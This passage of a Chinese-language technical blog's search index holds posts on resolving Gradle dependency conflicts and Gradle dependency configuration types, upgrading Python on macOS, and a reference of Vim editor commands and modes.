org.apache.tomcat.embed:tomcat-embed-websocket:9.0.13|    |         \--- org.apache.tomcat.embed:tomcat-embed-core:9.0.13|    +--- org.hibernate.validator:hibernate-validator:6.0.13.Final (*)|    +--- org.springframework:spring-web:5.1.3.RELEASE (*)|    \--- org.springframework:spring-webmvc:5.1.3.RELEASE|         +--- org.springframework:spring-aop:5.1.3.RELEASE (*)|         +--- org.springframework:spring-beans:5.1.3.RELEASE (*)|         +--- org.springframework:spring-context:5.1.3.RELEASE (*)|         +--- org.springframework:spring-core:5.1.3.RELEASE (*)|         +--- org.springframework:spring-expression:5.1.3.RELEASE (*)|         \--- org.springframework:spring-web:5.1.3.RELEASE (*)+--- org.springframework.boot:spring-boot-starter-amqp -> 2.1.1.RELEASE|    +--- org.springframework.boot:spring-boot-starter:2.1.1.RELEASE (*)|    +--- org.springframework:spring-messaging:5.1.3.RELEASE|    |    +--- org.springframework:spring-beans:5.1.3.RELEASE (*)|    |    \--- org.springframework:spring-core:5.1.3.RELEASE (*)|    \--- org.springframework.amqp:spring-rabbit:2.1.2.RELEASE|         +--- org.springframework.amqp:spring-amqp:2.1.2.RELEASE|         |    +--- org.springframework:spring-core:5.1.3.RELEASE (*)|         |    \--- org.springframework.retry:spring-retry:1.2.2.RELEASE|         |         \--- org.springframework:spring-core:4.3.13.RELEASE -> 5.1.3.RELEASE (*)|         +--- com.rabbitmq:amqp-client:5.4.3|         |    \--- org.slf4j:slf4j-api:1.7.25|         +--- org.springframework:spring-context:5.1.3.RELEASE (*)|         +--- org.springframework:spring-messaging:5.1.3.RELEASE (*)|         \--- org.springframework:spring-tx:5.1.3.RELEASE (*)testRuntimeOnly - Runtime only dependencies for source set 'test'. (n)No dependencies<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="使用插件gradle-view"><a href="#使用插件gradle-view" class="headerlink" title="使用插件gradle-view"></a>使用插件gradle-view</h3><p>利用插件gradle-view可以直接通过面板的形式看到是哪个依赖库，具体是冲突了哪个版本。</p><p>插件地址：<a href="https://plugins.jetbrains.com/plugin/7150-gradle-view" target="_blank" rel="noopener">https://plugins.jetbrains.com/plugin/7150-gradle-view</a><br><img src="7CBE789B-24EF-490D-90CF-DA06919E8C62.png" alt></p><h2 id="如何解决冲突"><a href="#如何解决冲突" class="headerlink" title="如何解决冲突"></a>如何解决冲突</h2><h3 id="删除其中一个jar包"><a href="#删除其中一个jar包" class="headerlink" title="删除其中一个jar包"></a>删除其中一个jar包</h3><p>删除其中一个jar包。</p><h3 id="使用exclude来去除传递依赖"><a href="#使用exclude来去除传递依赖" class="headerlink" title="使用exclude来去除传递依赖"></a>使用exclude来去除传递依赖</h3><p>在知道是哪个库的哪些依赖的情况下,可以使用exclude来去除传递依赖，<br>        exclude module：过滤模块<br>        exclude group：过滤包名下所有依赖</p><p>如下：</p><pre class="line-numbers language-gradle"><code class="language-gradle">implementation("com.qcloud:cos_api:5.6.0") {        exclude group: 'org.slf4j'    }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="取消所有传递依赖"><a href="#取消所有传递依赖" class="headerlink" title="取消所有传递依赖"></a>取消所有传递依赖</h3><pre class="line-numbers language-gradle"><code class="language-gradle">configurations.all {   transitive = false}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="强制依赖"><a href="#强制依赖" class="headerlink" title="强制依赖"></a>强制依赖</h3><p>对冲突的jar强行制定一个版本</p><pre class="line-numbers language-gradle"><code class="language-gradle">gradleconfigurations.all {    resolutionStrategy.force "com.amazonaws:aws-java-sdk-bom:1.11.698"}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> gradle </category>
          
      </categories>
      
      
        <tags>
            
            <tag> gradle </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Gradle依赖(dependencies)类型</title>
      <link href="/2020/07/20/gradle-dependencied/"/>
      <url>/2020/07/20/gradle-dependencied/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>dependencies用来配置当项目的依赖项。我们常常在gradle配置文件中看到api,implementation,compile……。</p><pre class="line-numbers language-gradle"><code class="language-gradle">dependencies {    testImplementation "org.springframework.boot:spring-boot-starter-test"    compileOnly "org.springframework.boot:spring-boot-configuration-processor"    compile group: 'com.github.xiaoymin', name: 'knife4j-spring-ui', version: '2.0.1'    implementation 'org.springframework.cloud:spring-cloud-starter-config'    api 'com.squareup.okhttp3:okhttp:3.14.7'}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="dependencies类型"><a href="#dependencies类型" class="headerlink" title="dependencies类型"></a>dependencies类型</h2><p>ependencies的类型可以分为以下几种</p><ul><li><p>compile</p><ol><li>testCompile</li><li>debugCompile</li><li>releaseCompile</li><li>compileOnly</li></ol></li><li><p>implementation</p><ol><li>testImplementation</li><li>debugImplementation</li><li>releaseImplementation    </li></ol></li><li><p>provided</p></li><li><p>api</p></li></ul><h3 id="compile"><a href="#compile" class="headerlink" title="compile"></a>compile</h3><p>从依赖上讲，用compile修饰的配置会传递依赖，而大多数的依赖冲突都是由compile产生的，什么是传递依赖？<br>打个比方：我们现在有libA，然后libB用compile依赖libA，最后libC依赖libB。那这个时候，libC自然能够使用libA的内容，因为libA的内容跟随这个libB而传递到了libC中。<br><img src="0CA30198-6E91-4D8E-A268-5637657A34B2.png" alt><br>而且compile得越多，所产生的依赖树也就越长，也就越难控制。</p><p>从编译上讲，使用compile配置的依赖项，会跟随打包流程将源码打包到jar中。</p><p>这两个依赖项配置和compile是差不多的，也会产生传递依赖，唯一不同的是，testcompile和<br>Testcompile不会参与源码打包，只会参与测试包的打包，并且只有在测试模式下启动才会生效，debug和release包不生效。</p><p>debugCompile和releaseCompile</p><p>debugCompile<br>只在buildType为debug的时候参与打包，release不参与打包，比方说我们的内存泄露检测工具-LeakCanary，其实我们也只是需要在debug模式下打包调试，而发布release版本就需要进行打包了，所以用debugCompile来进行配置<br>releaseCompile<br>releaseCompile和debugCompile完全相反，只在release模式下参与打包，应用场景不是很多。</p><h3 id="implementation"><a href="#implementation" class="headerlink" title="implementation"></a>implementation</h3><p>implementation 是Gradle4.1新增的依赖方式，implementation和compile不同，该依赖方式不会产生传递依赖，implementation有点像provided和、debugCompile和releaseCompile的集合体。<br>来个具体场景，例如：有libA公共库，libB通过implementation依赖libB，然后app无论通过什么方式依赖libB，lib1的依赖都不会传递过来，必须要在app中重新依赖一次。如下图：<br><img src="3B26A415-589E-4EE9-95E6-EAD19543E16B.png" alt><br>使用implementation有什么好处呢？</p><p>很大程度减少重复依赖的问题<br>在开源 lib 的时候尽量采用implementation的方式依赖一些v4、v7包</p><h3 id="provided"><a href="#provided" class="headerlink" title="provided"></a>provided</h3><p>只参与编译，不参与打包。例如说有libB依赖了libA，moduleC又同时依赖了libA和libB，那么libB就可以使用provided来依赖libA。</p><h3 id="api"><a href="#api" class="headerlink" title="api"></a>api</h3><p>api是Gradle4.1新增的依赖方式,其作用于compile基本一致。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p> 对于使用Gradle plugin 3.X以上版本的gradle，我们应该转而使用implementation，减少compile的使用，避免依赖冲突的产生。如果我们有开放的lib，那么更加应该使用implementation导入依赖，尽量少给lib的使用者造成困扰。</p>]]></content>
      
      
      <categories>
          
          <category> gradle </category>
          
      </categories>
      
      
        <tags>
            
            <tag> gradle </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>macos Python 版本问题</title>
      <link href="/2020/07/20/python-macos/"/>
      <url>/2020/07/20/python-macos/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>macos系统自带的python2.7，但是2020年python2.7已经不再维护，因此我们需要升级到3.0以上。</p><h1 id="查看已安装python版本"><a href="#查看已安装python版本" class="headerlink" title="查看已安装python版本"></a>查看已安装python版本</h1><p><code>python -V</code></p><h1 id="安装路径"><a href="#安装路径" class="headerlink" title="安装路径"></a>安装路径</h1><p>不同方式安装有不同的安装路径：<br>系统默认<br><code>/System/Library/Frameworks/Python.framework/Versions/2.7</code></p><p>brew 安装<br><code>/usr/local/Cellar/python</code></p><p>官网pkg安装   <code>/Library/Frameworks/Python.framework/Versions/3.7</code></p><h1 id="升级"><a href="#升级" class="headerlink" title="升级"></a>升级</h1><p>升级python主要有两种方法</p><h2 id="使用Mac自带的包管理工具brew"><a href="#使用Mac自带的包管理工具brew" class="headerlink" title="使用Mac自带的包管理工具brew"></a>使用Mac自带的包管理工具brew</h2><p><code>brew upgrade python</code></p><h2 id="下载安装包升级"><a href="#下载安装包升级" class="headerlink" title="下载安装包升级"></a>下载安装包升级</h2><p>python官网下载 地址：<a href="https://www.python.org/downloads/" target="_blank" rel="noopener">https://www.python.org/downloads/</a></p><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p>使用软链接，把终端中的python和pip，指定为我们下载后的python3和pip3。这可以通过修改环境来实现<br>打开环境变量：根据自己的安装方式，找到安装目录，添加进环境。</p><pre class="line-numbers language-shell"><code class="language-shell">open ~/.bash.profile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-vim"><code class="language-vim">alias python3<span class="token operator">=</span><span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>Cellar<span class="token operator">/</span><span class="token keyword">python</span>@<span class="token number">3.8</span><span class="token operator">/</span><span class="token number">3.8</span><span class="token operator">.</span><span class="token number">2</span><span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>python3<span class="token operator">.</span><span class="token number">8</span>alias python2<span class="token operator">=</span><span class="token operator">/</span>System<span class="token operator">/</span>Library<span class="token operator">/</span>Frameworks<span class="token operator">/</span>Python<span class="token operator">.</span>framework<span class="token operator">/</span>Versions<span class="token operator">/</span><span class="token number">2.7</span><span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>python2<span class="token operator">.</span><span class="token number">7</span>alias <span class="token keyword">python</span><span class="token operator">=</span>python3alias pip<span class="token operator">=</span><span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>Cellar<span class="token operator">/</span><span class="token keyword">python</span>@<span class="token number">3.8</span><span class="token operator">/</span><span class="token number">3.8</span><span class="token operator">.</span><span class="token number">2</span><span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>pip3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-shell"><code class="language-shell">source ~/.bash_profile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> macos </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> macos </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VIM编辑器</title>
      <link href="/2020/02/16/vim/"/>
      <url>/2020/02/16/vim/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>vi是一个命令行界面下的文本编辑工具，最早在1976年由bill joy开发，当时名字叫做ex,vi支持大多数操作系统（最早在BSD上发布），并且功能已经十分强大。1991年bram基于vi进行了改进，发布了vim,加入了GUI的支持。<br>当前vim已经不仅仅是普通意义上的文本编辑器（如window上的记事本），而是被广泛的作为在文本编辑，文本处理，代码开发等用途。<br>Linux中知名的文本编辑器还有emacs,它的功能比vim还要强大。<br>绝大数Linux系统上均安装vim，vim比vi的功能更为强大。<br>vim命令可以启动vim编辑器<br>一般我们使用vim+目标文件路径的形式使用vim<br>如果目标文件存在，则vim打开文件，如果目标文件不存在，则vim新建并打开该文件</p><h2 id="四种模式"><a href="#四种模式" class="headerlink" title="四种模式"></a>四种模式</h2><h3 id="normal模式"><a href="#normal模式" class="headerlink" title="normal模式"></a>normal模式</h3><p>vim启动后，默认进入normal模式，任何模式都可以通过esc键回到normal模式（可以按几次）。normal模式下可以通过键入不同的命令完成选择，复制，粘贴，撤销等等操作。</p><p><strong>进入插入模式：</strong><br> i（insert）: 在光标前插入文本<br>o (open a line below): 在当前行的下面插入新行<br>a (append):追加，在当前光标后插入<br>A：在行最后位置插入<br>I：  在行最前的位置插入<br>O：在当前编辑位置的上面新起一行</p><p><strong>移动：</strong><br>h:左<br>j:下<br>k:上<br>l:右</p><p><strong>在单词之间移动：</strong><br>w/W 移到下一个word/WORD开头，<br>e/E 下一个word/WORD结尾<br>b/B 回到上一个word/WORD开头 backword<br>word指的是以非空白符分割的单词，WORD指的是以空白符分割的单词。</p><p><strong>行间搜索移动：</strong><br>同一行快速移动的方式其实是搜索一个字符并且移动到该字符<br>使用f{char}可以移动到char字符上，t移动到char的前一个字符<br>如果第一次没有搜到，可以用分号；/逗号，继续搜该行下一个/上一个。<br>大写的F表示反过来搜前面的字符</p><p><strong>vim 水平移动：</strong><br>0移动到行首第一个字符<br>^移动到第一个非空白字符<br>$移动到行尾<br>g_移动到行尾非空白字符</p><p><strong>vim垂直移动：</strong><br>在句子sentence和段落paragraph间移动<br>使用括号（）在句子间移动<br>使用{}在段落之间移动<br>使用easy-montion插件移动。</p><p><strong>vim 页面移动：</strong><br>gg/G移动到文件开头和结尾<br>ctrl+o快速返回。<br>H/M/L 跳转到屏幕的开头head,中间middle，结尾lower<br>ctrl+u ctrl+f上下翻页，upword/forword<br>zz把屏幕置为中间。</p><p><strong>删除：</strong><br>    x:删除当前光标所在的一个字符<br>    .:再次删除一个字符<br>    N<command>:<br>        10x：删除10个连续字符<br>        3dd：删除三行文本<br>    dw:删除一个单词，dnw，n换为数字，删除n个单词</p><p><strong>行间跳转：</strong><br>                nG(c shift+g)： 游标移动到第几行<br>                gg：游标移动第一行<br>                G(shift+g) ：游标移动到最后一行<br>                ctrl+o : 快速回到上一次光标所在位置<br>                ~:将游标所在字母变成大写</p><p><strong>复制和粘贴：</strong><br>             yy将当前行的内容放入缓冲区（复制游标所在的整行，3yy表示复制3行）<br>                y^ 复制至行首，或y0。不含光标所在处字符。<br>                y$ 复制至行尾。含光标所在处字符。<br>                yw 复制一个单词。<br>                y2w 复制两个单词。<br>                yG 复制至文本末。<br>                y1G 复制至文本开头。<br>                p将缓冲区中的文本放入光标后（粘贴）<br>                p(小写)代表粘贴至光标后（下）<br>                P(大写)代表粘贴至光标前（上）<br>        dd:剪切<br>        p:粘贴<br>        ddp:交换上下行位置</p><p><strong>查找和替换(undo命令)：</strong></p><p>r+&lt;代替换字母&gt;：将游标所在字母替换为指定字母<br>R    连续替换，直到按下Esc<br>cc    替换整行，即删除游标所在行，并进入插入模式<br>cw    替换一个单词，即删除一个单词，并进入插入模式<br>C(大写)    替换游标以后至行末<br>~    反转游标所在字母大小写</p><p><strong>撤销：</strong><br>u{n}    撤销一次或n次操作<br>U(大写)    撤销当前行的所有修改<br>Ctrl+r    redo，即撤销undo的操作</p><p><strong>快速缩进：</strong><br>        &gt;&gt; 整行将向右缩进<br>        &lt;&lt; 整行向左回退<br>        :set shiftwidth?  获取目前设定值<br>        :set shiftwidth=10 设置缩进为10个字符<br>命令行模式下输入<br>                                :ri(right)命令使本行文本靠右<br>                                :ce(center)命令使本行内容居中<br>                                le(left)命令使本行内容靠左</p><p><strong>快速查找：</strong><br>        / string  然后回车查找字符串string<br>        n  查找下一个string<br>        ? tcp 向上查找字符串tcp<br>        N 查找上一个出现的tcp<br>        命令模式下输入 noh 回车取消搜索</p><pre><code>    普通模式下输入\*寻找游标所在处的单词    普通模式下输入\#同上，但 \# 是向前（上）找，\*则是向后（下）找    普通模式下输入g\*同\* ，但部分符合该单词即可    普通模式下输入g\#同\# ，但部分符合该单词即可</code></pre><h3 id="insert模式"><a href="#insert模式" class="headerlink" title="insert模式"></a>insert模式</h3><pre><code> 命令模式 按i 即可进入插入模式，在插入模式中可以输入编辑文本内容，按esc键可以返回命令模式</code></pre><p><strong>如何快速纠错</strong>：<br> ctrl+h 删除上一个字符<br> ctrl+w 删除上一个单词<br> ctrl+u 删除当前行</p><p><strong>快速切换normal和insert</strong><br>esc,ctrl+c,ctrl+[<br>gi快速跳转到你最后一次编辑的地方并进入插入模式。<br>如何映射方便的快捷键来替代esc</p><h3 id="command模式"><a href="#command模式" class="headerlink" title="command模式"></a>command模式</h3><pre><code> 在normal模式中按“：”进入command模式，光标会移动到底部，在这里可以保存，修改或退出vim    :w  write保存当前修改    :q  quit退出    :wq write quit 保存退出    :q!  quit!强制退出    :x 保存并退出    :set nu    显示行号    :! 系统命令 执行一个系统命令并显示结果    :sh  切换到命令行，使用ctrl+d切换回vim    :vs(vertical split),sp(split) 分屏 :% s/java/python/g 全局替换 java替换为python</code></pre><h3 id="visual-可视-模式"><a href="#visual-可视-模式" class="headerlink" title="visual(可视)模式"></a>visual(可视)模式</h3><p>visua模式一般用来块状选择文本，normal模式下使用v进入visual选择。使用V选择行。使用ctrl+v进行块状选择。</p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vim </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
